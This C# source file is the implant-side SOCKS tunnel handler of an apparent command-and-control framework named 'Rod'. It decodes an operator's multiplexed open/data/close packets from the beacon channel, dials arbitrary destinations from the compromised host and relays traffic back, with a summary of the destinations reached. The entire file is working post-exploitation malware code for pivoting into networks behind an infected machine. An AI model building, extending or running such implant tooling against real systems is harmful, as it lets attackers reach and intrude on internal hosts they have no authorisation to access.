using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Text;
using System.Threading.Channels;
using Rod.V1;

namespace Rod.Implant.Internal;

// The tunnel.socks handler (architecture.md Sec 5.2, Sec 10.1, Sec 14): the
// multiplexed arm of the tunnel set. Where tunnel.forward bridges one TCP
// connection, tunnel.socks bridges many -- the channel's byte stream is the
// proxy's own connection-multiplexed grammar, so an operator's SOCKS-configured
// tooling reaches arbitrary hosts through the one task without per-connection
// tasking. The grammar is verb-local, carried entirely inside the opaque
// channel bytes (architecture.md Sec 10: the escape hatch is per-verb, and a
// channel's byte stream is its verb's grammar):
//
//     packet := kind(1) connection(4, LE) length(2, LE) payload(length)
//     open   (1): payload := port(2, LE) host-length(1) host-bytes
//     data   (2): payload := the proxied bytes, at most 16384
//     close  (3): payload empty -- the connection ended
//     opened (4): payload := status(1) -- 0 connected, otherwise refused
//
// The operator side (a SOCKS listener bound onto the dispatched channel) owns
// the connection ids; this half echoes them. Every packet is one whole
// WriteOutputAsync call, and the beacon stream's single-writer discipline
// serializes whole frames, so packets never interleave mid-flight. The
// channel ends with the operator's eof (the proxy is closed) or the beacon
// stream dying (the session-scoped lifetime every channel verb shares); the
// task's final output is the proxy's summary -- the destinations it dialed
// and the bytes it moved, the traffic's attributed record.

/// <summary>
/// The SOCKS proxy handler: parses the channel's connection-multiplexed
/// grammar, dials each open packet's destination from the implant's own
/// vantage, and pumps every connection's bytes both ways until the channel
/// ends, with the proxy summary (connections, destinations, byte tallies) as
/// the task's final output.
/// </summary>
internal static class TunnelSocks
{
    // One data packet's payload ceiling: the same chunk budget the other
    // channel pumps use, so a packet frames inside the channel's output
    // budget with protobuf overhead to spare.
    internal const int MaxDataBytes = 16 * 1024;

    // The largest payload any packet kind carries (an open's destination
    // caps at 2 + 1 + 255 bytes); anything longer is a malformed stream.
    internal const int MaxPacketBytes = MaxDataBytes;

    // How long one outbound dial may take before the connection is refused:
    // a blackholed destination must fail its connection, not park the proxy.
    private static readonly TimeSpan ConnectTimeout = TimeSpan.FromSeconds(10);

    /// <summary>
    /// Runs the proxy on <paramref name="stream"/> until the operator's eof
    /// or the channel ends, and returns the outcome with the proxy summary
    /// as the task's final output.
    /// </summary>
    public static async Task<(TaskOutcome Outcome, string Output)> RunAsync(
        string arguments,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        if (!string.IsNullOrWhiteSpace(arguments))
            return (TaskOutcome.Failed, "tunnel.socks takes no arguments; destinations arrive per connection");

        using var gone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        var proxy = new Proxy(stream, gone.Token);
        try
        {
            while (true)
            {
                byte[]? data;
                bool eof;
                try
                {
                    (data, eof) = await stream.ReadInputAsync(gone.Token);
                }
                catch (ChannelClosedException)
                {
                    // The channel host completed the input; the same shape as
                    // the operator's end.
                    break;
                }

                if (data is { Length: > 0 } && !proxy.Accept(data))
                    return (TaskOutcome.Failed, "socks channel closed: malformed packet stream");

                if (eof)
                    break;
            }

            await proxy.StopAsync();
            return (TaskOutcome.Succeeded, proxy.Summary());
        }
        catch (OperationCanceledException)
        {
            await proxy.StopAsync();
            return (TaskOutcome.Failed, "socks channel closed: the beacon stream ended");
        }
        catch (Exception ex)
        {
            await proxy.StopAsync();
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    // One decoded packet off the channel.
    private readonly record struct Packet(byte Kind, uint Id, byte[] Payload);

    // Re-frames the channel's raw input bytes into whole packets. The
    // receiver concatenates chunks without regard for framing (the channel
    // contract), so this holds the unparsed remainder and extracts each
    // complete packet in arrival order. A legal stream never carries more
    // than one packet's worth of unparsed bytes, a packet with an unknown
    // kind or an oversized length is malformed, and both end the proxy
    // rather than corrupting a connection silently.
    private sealed class Parser
    {
        // The unparsed-remainder ceiling: the operator side frames one packet
        // per input unit, but the parser owes the channel contract nothing --
        // arbitrary splits are legal, and only a stream that truly cannot be
        // framed ends the proxy.
        private const int MaxBufferBytes = 1024 * 1024;

        private byte[] _buffer = new byte[MaxPacketBytes + 7];
        private int _length;

        public bool IsCorrupt { get; private set; }

        public IReadOnlyList<Packet> Append(ReadOnlySpan<byte> data)
        {
            var packets = new List<Packet>();
            if (IsCorrupt)
                return packets;

            if (data.Length + _length > _buffer.Length)
            {
                if (data.Length + _length > MaxBufferBytes)
                {
                    IsCorrupt = true;
                    return packets;
                }
                var grown = new byte[Math.Max(data.Length + _length, _buffer.Length * 2)];
                _buffer.AsSpan(0, _length).CopyTo(grown);
                _buffer = grown;
            }
            data.CopyTo(_buffer.AsSpan(_length));
            _length += data.Length;

            while (_length >= 7)
            {
                var kind = _buffer[0];
                var id = BinaryPrimitives.ReadUInt32LittleEndian(_buffer.AsSpan(1));
                var length = BinaryPrimitives.ReadUInt16LittleEndian(_buffer.AsSpan(5));
                if (kind is not (PacketKind.Open or PacketKind.Data or PacketKind.Close or PacketKind.Opened)
                    || length > MaxPacketBytes)
                {
                    IsCorrupt = true;
                    return packets;
                }
                if (_length < 7 + length)
                    break; // the packet's tail is still in flight

                packets.Add(new Packet(kind, id, _buffer[7..(7 + length)]));
                var consumed = 7 + length;
                Array.Copy(_buffer, consumed, _buffer, 0, _length - consumed);
                _length -= consumed;
            }
            return packets;
        }
    }

    // The proxy's live state: every connection under its id, the counters
    // the summary reports, and the packet encoder. One instance per task.
    private sealed class Proxy
    {
        private readonly IChannelStream _stream;
        private readonly CancellationToken _gone;
        private readonly ConcurrentDictionary<uint, Connection> _connections = new();
        private readonly Parser _parser = new();
        private long _bytesUp;
        private long _bytesDown;
        private long _connected;
        private long _refused;
        private readonly ConcurrentDictionary<string, int> _destinations = new(StringComparer.Ordinal);

        public Proxy(IChannelStream stream, CancellationToken gone)
        {
            _stream = stream;
            _gone = gone;
        }

        // Re-frames the channel's raw input bytes and dispatches every whole
        // packet they complete -- the channel contract concatenates chunks
        // without regard for framing, so the parser rebuilds packets from
        // the stream. False when the stream is malformed: the proxy must
        // end, not limp on a broken frame.
        public bool Accept(ReadOnlySpan<byte> data)
        {
            foreach (var packet in _parser.Append(data))
            {
                switch (packet.Kind)
                {
                    case PacketKind.Open:
                        if (!TryOpen(packet.Id, packet.Payload))
                            return false;
                        break;
                    case PacketKind.Data:
                        Send(packet.Id, packet.Payload);
                        break;
                    case PacketKind.Close:
                        if (_connections.TryRemove(packet.Id, out var closed))
                            _ = closed.CloseAsync();
                        break;
                    case PacketKind.Opened:
                        return false; // the operator side allocates ids; it never sends this
                }
            }
            return !_parser.IsCorrupt;
        }

        // One open packet: parse the destination, dial it from this
        // implant's vantage, and answer with the dial's result -- the
        // operator's SOCKS reply waits on it.
        private bool TryOpen(uint id, byte[] payload)
        {
            if (_connections.ContainsKey(id))
                return false; // ids are the operator side's to allocate; a repeat is malformed
            if (payload.Length < 3)
                return false;

            var port = BinaryPrimitives.ReadUInt16LittleEndian(payload);
            var hostLength = payload[2];
            if (hostLength == 0 || payload.Length < 3 + hostLength)
                return false;
            var host = Encoding.ASCII.GetString(payload, 3, hostLength);
            _destinations.AddOrUpdate($"{host}:{port}", 1, (_, count) => count + 1);

            _ = DialAsync(id, host, port);
            return true;
        }

        private async Task DialAsync(uint id, string host, int port)
        {
            var client = new TcpClient();
            try
            {
                using var connect = CancellationTokenSource.CreateLinkedTokenSource(_gone);
                connect.CancelAfter(ConnectTimeout);
                await client.ConnectAsync(host, port, connect.Token);
            }
            catch (Exception ex) when (ex is OperationCanceledException or SocketException or IOException)
            {
                Interlocked.Increment(ref _refused);
                client.Close();
                await WritePacket(PacketKind.Opened, id, new byte[] { 1 });
                return;
            }

            Interlocked.Increment(ref _connected);
            var connection = new Connection(client, this, id);
            _connections[id] = connection;
            await WritePacket(PacketKind.Opened, id, new byte[] { 0 });
            _ = connection.PumpDownAsync();
        }

        // One data packet: the operator's bytes onto the target's socket.
        // A dead target ends its connection -- the proxy keeps the rest.
        private void Send(uint id, byte[] payload)
        {
            if (!_connections.TryGetValue(id, out var connection))
                return; // data for an ended connection; nothing to do

            Interlocked.Add(ref _bytesUp, payload.Length);
            _ = connection.SendAsync(payload);
        }

        // The channel's end: close every connection and drain the sockets'
        // pumps so nothing outlives the task.
        public async Task StopAsync()
        {
            foreach (var id in _connections.Keys)
            {
                if (_connections.TryRemove(id, out var connection))
                    _ = connection.CloseAsync();
            }
        }

        public string Summary()
        {
            var builder = new StringBuilder()
                .Append("socks proxy closed: ")
                .Append(Interlocked.Read(ref _connected))
                .Append(" connections (")
                .Append(Interlocked.Read(ref _refused))
                .Append(" refused), ")
                .Append(Interlocked.Read(ref _bytesUp))
                .Append(" bytes up, ")
                .Append(Interlocked.Read(ref _bytesDown))
                .Append(" bytes down");
            foreach (var destination in _destinations.OrderBy(d => d.Key, StringComparer.Ordinal))
            {
                builder.AppendLine().Append("  ").Append(destination.Key);
                if (destination.Value > 1)
                    builder.Append(" x").Append(destination.Value);
            }
            return builder.ToString();
        }

        // Encodes and writes one whole packet: a single WriteOutputAsync
        // call, so the stream's single-writer discipline frames it whole.
        // A cancelled write is the channel ending; the read loop reports it.
        public async Task WritePacket(byte kind, uint id, ReadOnlyMemory<byte> payload)
        {
            var packet = new byte[7 + payload.Length];
            packet[0] = kind;
            BinaryPrimitives.WriteUInt32LittleEndian(packet.AsSpan(1), id);
            BinaryPrimitives.WriteUInt16LittleEndian(packet.AsSpan(5), (ushort)payload.Length);
            payload.CopyTo(packet.AsMemory(7));
            try
            {
                await _stream.WriteOutputAsync(packet, _gone);
            }
            catch (OperationCanceledException)
            {
                // The channel's end; the read loop owns the reporting.
            }
        }

        private void CountDown(int bytes) => Interlocked.Add(ref _bytesDown, bytes);

        // One proxied connection: the socket, its serialized send path, and
        // the down-pump that streams the target's answers back as data
        // packets.
        private sealed class Connection
        {
            private readonly TcpClient _client;
            private readonly Proxy _proxy;
            private readonly uint _id;
            private readonly TaskCompletionSource _closed = new(TaskCreationOptions.RunContinuationsAsynchronously);
            private readonly SemaphoreSlim _sendGate = new(1, 1);

            public Connection(TcpClient client, Proxy proxy, uint id)
            {
                _client = client;
                _proxy = proxy;
                _id = id;
            }

            public async Task SendAsync(byte[] payload)
            {
                try
                {
                    await _sendGate.WaitAsync(_proxy._gone);
                    try
                    {
                        await _client.GetStream().WriteAsync(payload, CancellationToken.None);
                    }
                    finally
                    {
                        _ = _sendGate.Release();
                    }
                }
                catch (Exception ex) when (ex is IOException or SocketException or ObjectDisposedException or OperationCanceledException)
                {
                    await EndAsync();
                }
            }

            // The target's answers upstream as data packets, one read per
            // packet. The target ending its side closes the connection and
            // tells the operator side.
            public async Task PumpDownAsync()
            {
                var buffer = new byte[MaxDataBytes];
                try
                {
                    while (true)
                    {
                        var read = await _client.GetStream().ReadAsync(buffer, _proxy._gone);
                        if (read <= 0)
                            break;
                        _proxy.CountDown(read);
                        await _proxy.WritePacket(PacketKind.Data, _id, buffer.AsMemory(0, read));
                    }
                }
                catch (Exception ex) when (ex is IOException or SocketException or ObjectDisposedException or OperationCanceledException)
                {
                    // The socket faulted or the channel ended; EndAsync below tells the operator.
                }
                finally
                {
                    await EndAsync();
                }
            }

            public async Task CloseAsync()
            {
                _client.Close();
                try
                {
                    await _closed.Task.WaitAsync(TimeSpan.FromSeconds(5));
                }
                catch (TimeoutException)
                {
                    // The pump is unwinding behind a dead socket; it cannot
                    // hold the task past this grace.
                }
            }

            // Tears the connection down once: socket, close packet, and the
            // completion StopAsync's grace waits on.
            private async Task EndAsync()
            {
                _client.Close();
                await _proxy.WritePacket(PacketKind.Close, _id, ReadOnlyMemory<byte>.Empty);
                _closed.TrySetResult();
            }
        }
    }

    // The packet kinds of the channel grammar.
    internal static class PacketKind
    {
        public const byte Open = 1;
        public const byte Data = 2;
        public const byte Close = 3;
        public const byte Opened = 4;
    }
}
